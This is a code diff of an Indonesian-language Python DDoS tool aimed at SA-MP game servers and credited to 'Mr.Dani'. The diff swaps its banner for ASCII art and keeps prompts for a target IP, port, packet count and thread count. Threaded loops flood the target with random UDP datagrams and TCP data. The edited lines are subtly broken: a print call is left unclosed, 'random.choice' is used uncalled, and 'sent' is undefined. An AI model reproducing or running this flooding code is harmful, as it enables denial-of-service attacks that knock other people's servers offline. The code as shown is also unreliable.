@@ -4,30 +4,40 @@ import random
 import socket
 import threading
 
-print("~~~ DDOS TOOLS BY MR.DANI KHUSUS TEAM DANI ~~~")
-print("~~~ Scripting By MR.DANI ~~~")
-print("~~~ Script ini dibuat hanya untuk TEAM DANI. ~~~")
-ip = str(input(" Target Ip:"))
-port = int(input(" Target Port:"))
-choice = str(input(" siap untuk ddos(y/n):"))
-times = int(input(" Paket yang dikirim ke target:"))
-threads = int(input(" Threads yang dikirim:"))
+os.system("clear")
+print(" =========================================================================")
+print("                       TOOLS BY M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐
+print(" =========================================================================")
+print(" ███╗░░░███╗██████╗░░░░██████╗░░█████╗░███╗░░██╗██╗")
+print(" ████╗░████║██╔══██╗░░░██╔══██╗██╔══██╗████╗░██║██║")
+print(" ██╔████╔██║██████╔╝░░░██║░░██║███████║██╔██╗██║██║")
+print(" ██║╚██╔╝██║██╔══██╗░░░██║░░██║██╔══██║██║╚████║██║")
+print(" ██║░╚═╝░██║██║░░██║██╗██████╔╝██║░░██║██║░╚███║██║")
+print(" ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝")
+print(" DDOS ATTACK FOR SAMP")
+print(" Script Ini Dibuat Hanya Untuk Team Mr.Dani")
+
+ip = str(input(" HOST/IP:"))
+port = int(input(" PORT:"))
+choice = str(input(" SIAP UNTUK DDOS(y/n):"))
+times = int(input(" PACKETS:"))
+threads = int(input(" ISI PACKETS:"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]"))
+	i = random.choice
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" TOK TOK TOK PAKET MR.DANI")
+			print(i +" PACKET DARI M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ %s TOK TOK TOK PACKET OTW IP %s DAN MEMBERI PACKET KE PORT%s!!"%(sent,ip,port))
 		except:
 			print("[!] Error!!!")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]","[PAKET DARI MR.DANI]"))
+	i = random.choice
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -35,7 +45,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" TOK TOK TOK PAKET MR.DANI")
+			print(i +" PACKET DARI M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ %s TOK TOK TOK PACKET OTW IP %s DAN MEMBERI PACKET KE PORT%s!!"%(sent,ip,port))
 		except:
 			s.close()
 			print("[*] Error")
